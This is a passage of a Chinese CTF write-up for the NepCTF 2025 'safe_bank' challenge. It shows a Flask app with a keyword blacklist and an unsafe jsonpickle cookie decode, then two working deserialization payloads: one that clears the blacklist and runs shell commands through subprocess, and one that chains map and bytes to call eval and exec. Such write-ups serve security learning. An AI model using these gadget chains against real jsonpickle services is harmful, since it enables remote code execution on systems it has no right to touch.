class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;Popen&#x27;</span>, <span class="string">&#x27;nt&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;render_template&#x27;</span>, <span class="string">&#x27;jsonpickle&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;state&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;jinja2&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__func__&#x27;</span>, <span class="string">&#x27;__self__&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__mro__&#x27;</span>, <span class="string">&#x27;__subclasses__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">serialized</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = json.loads(serialized)</span><br><span class="line">        payload = json.dumps(data, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> bad <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">if</span> bad <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> bad</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        confirm_password = request.form.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password <span class="keyword">or</span> <span class="keyword">not</span> confirm_password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;所有字段都是必填的。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> password != confirm_password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;密码不匹配。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;用户名至少需要4个字符，密码至少需要6个字符。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> register_user(username, password):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, message=<span class="string">&quot;注册成功！请登录。&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;用户名已存在。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/auth&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    u = request.form.get(<span class="string">&quot;u&quot;</span>)</span><br><span class="line">    p = request.form.get(<span class="string">&quot;p&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> acc <span class="keyword">in</span> users_db:</span><br><span class="line">        <span class="keyword">if</span> acc.uid == u <span class="keyword">and</span> acc.pwd == p:</span><br><span class="line">            sess_data = Session(&#123;<span class="string">&#x27;user&#x27;</span>: u, <span class="string">&#x27;ts&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;)</span><br><span class="line">            token_raw = jsonpickle.encode(sess_data)</span><br><span class="line">            b64_token = base64.b64encode(token_raw.encode()).decode()</span><br><span class="line">            resp = make_response(<span class="string">&quot;登录成功。&quot;</span>)</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;authz&quot;</span>, b64_token)</span><br><span class="line">            resp.status_code = <span class="number">302</span></span><br><span class="line">            resp.headers[<span class="string">&#x27;Location&#x27;</span>] = <span class="string">&#x27;/panel&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&quot;登录失败。用户名或密码无效。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/panel&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">panel</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;authz&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>, error=<span class="string">&quot;缺少Token。&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = base64.b64decode(token.encode()).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;Token格式错误。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    ban = waf(decoded)</span><br><span class="line">    <span class="keyword">if</span> waf(decoded):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">f&quot;请不要黑客攻击！<span class="subst">&#123;ban&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br><span class="line">        meta = sess_obj.meta</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta.get(<span class="string">&quot;user&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;user_panel.html&#x27;</span>, username=meta.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin_panel.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">f&quot;数据解码失败。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/vault&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vault</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;authz&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded = base64.b64decode(token.encode()).decode()</span><br><span class="line">        <span class="keyword">if</span> waf(decoded):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;请不要尝试黑客攻击！&quot;</span>)</span><br><span class="line">        sess_obj = jsonpickle.decode(decoded, safe=<span class="literal">True</span>)</span><br><span class="line">        meta = sess_obj.meta</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> meta.get(<span class="string">&quot;user&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, error=<span class="string">&quot;访问被拒绝。只有管理员才能查看此页面。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        flag = <span class="string">&quot;NepCTF&#123;fake_flag_this_is_not_the_real_one&#125;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;vault.html&#x27;</span>, flag=flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;root&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/about&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">about</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;about.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>当看到黑名单的时候心就已经凉了一半</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [</span><br><span class="line">    <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;Popen&#x27;</span>, <span class="string">&#x27;nt&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;\\\\\\\\&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;render_template&#x27;</span>, <span class="string">&#x27;jsonpickle&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;state&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;jinja2&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__func__&#x27;</span>, <span class="string">&#x27;__self__&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__mro__&#x27;</span>, <span class="string">&#x27;__subclasses__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="方法一：清理黑名单"><a href="#方法一：清理黑名单" class="headerlink" title="方法一：清理黑名单"></a>方法一：清理黑名单</h3><p>这个方法来自LAMENTXU师傅的文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/19007988">https://www.cnblogs.com/LAMENTXU/articles/19007988</a></p>
<p>具体是什么样的呢？</p>
<p>用到一个内置函数list.clear()</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804151456191.png" alt="image-20250804151456191"></p>
<p>我们本地测试一下</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804151555886.png" alt="image-20250804151555886"></p>
<p>因为这里的黑名单也是list类型，那我们是否可以调用FORBIDDEN.clear()去清空黑名单呢？</p>
<p>写个poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;__main__.Session&quot;</span>,</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: &#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;__main__.FORBIDDEN.clear&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : []&#125;,</span><br><span class="line">        <span class="string">&quot;ts&quot;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804151833193.png" alt="image-20250804151833193"></p>
<p>返回none，那我们检验一下是否被置空了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;subprocess.run&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;whoami&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804155407712.png" alt="image-20250804155407712"></p>
<p>这里的话因为run函数执行之后是返回一个对象，所以没有回显，但是返回0是说明执行成功了，那我们尝试换成subprocess.getoutput</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;subprocess.getoutput&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;whoami&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804160243842.png" alt="image-20250804160243842"></p>
<p>成功回显，那我们RCE执行&#x2F;readflag就行了</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804160337646.png" alt="image-20250804160337646"></p>
<h3 id="方法二：map类触发"><a href="#方法二：map类触发" class="headerlink" title="方法二：map类触发"></a>方法二：map类触发</h3><p><code>map()</code>函数的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map(function, iterable, ...)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>function</code>: 一个函数，用于对每个可迭代对象的元素执行操作。</li>
<li><code>iterable</code>: 一个或多个可迭代对象，可以是列表、元组、集合等。<br>所以map的参数需要用<code>[]</code>或者<code>&#123;&#125;</code>包裹</li>
</ul>
<p>但是map中的函数触发是需要被类用才能触发，比如bytes，list类接受迭代器参数初始化的时候</p>
<p>我们写个demo测试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> builtins  </span><br><span class="line"></span><br><span class="line">result = (<span class="built_in">map</span>(os.system, <span class="string">&#x27;echo 111&#x27;</span>))  </span><br><span class="line">result1= <span class="built_in">bytes</span>(<span class="built_in">map</span>(os.system, [<span class="string">&#x27;echo 123&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>这里只返回了123，说明bytes类能触发map的函数调用</p>
<p><strong>bytes在new的时候会触发map的实例化</strong>，比如这样就可以触发rce,</p>
<p>所以最终的poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;app.Session&quot;</span>,</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;__builtin__.bytes&quot;</span>,</span><br><span class="line">            <span class="string">&quot;py/newargs&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;__builtin__.map&quot;</span>,</span><br><span class="line">                <span class="string">&quot;py/newargs&quot;</span>: [</span><br><span class="line">                    &#123;<span class="string">&quot;py/function&quot;</span>: <span class="string">&quot;__builtin__.eval&quot;</span>&#125;,</span><br><span class="line">                    [<span class="string">f&quot;exec(<span class="subst">&#123;chr_command&#125;</span>)&quot;</span>],</span><br><span class="line">                ],</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;ts&quot;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E6%9D%A5%E4%B8%8D%E6%98%AFflag%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">原来不是flag？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E7%A9%B6%E6%BA%90%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">深究源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#py-object"><span class="toc-number">3.1.</span> <span class="toc-text">py&#x2F;object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py-newargs%E5%92%8Cpy-newargsex"><span class="toc-number">3.2.</span> <span class="toc-text">py&#x2F;newargs和py&#x2F;newargsex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">payload总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text">初次尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9A%E7%A7%AF%E8%96%84%E5%8F%91"><span class="toc-number">5.</span> <span class="toc-text">厚积薄发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%B8%85%E7%90%86%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">5.1.</span> <span class="toc-text">方法一：清理黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Amap%E7%B1%BB%E8%A7%A6%E5%8F%91"><span class="toc-number">5.2.</span> <span class="toc-text">方法二：map类触发</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&text=Nepctf2025 safe_bank深究"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&is_video=false&description=Nepctf2025 safe_bank深究"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Nepctf2025 safe_bank深究&body=Check out this article: https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&name=Nepctf2025 safe_bank深究&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&t=Nepctf2025 safe_bank深究"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
